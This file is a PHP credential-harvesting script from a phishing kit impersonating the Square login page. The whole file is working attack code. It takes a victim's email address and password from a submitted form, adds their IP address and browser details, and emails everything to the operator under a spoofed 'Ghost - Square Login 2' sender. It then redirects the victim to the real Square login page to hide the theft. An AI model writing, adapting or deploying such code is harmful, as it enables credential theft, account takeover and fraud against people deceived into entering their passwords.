<?php


if($_POST["realemail"] != "" and $_POST["realpassword"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Square Real Email Info-----------------------\n";
$message .= "Real Email Address            : ".$_POST['realemail']."\n";
$message .= "Real Email Password           : ".$_POST['realpassword']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- GHOST --------------|\n";
$subject = "Square Real Email Info| ".$_POST['realemail']." | $ip";
$headers = "From: Ghost - Square Login 2 <k1r4@app-crew.id>";
include 'email.php';
{
mail($to, $subject, $message, $headers);    
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://squareup.com/login");
}else{
header ("Location: secjhdjrhgyg87g85yg85yuryhfjhgtjbhjfhbjgbhutyb8t8ybughbjgj.php");
}

?>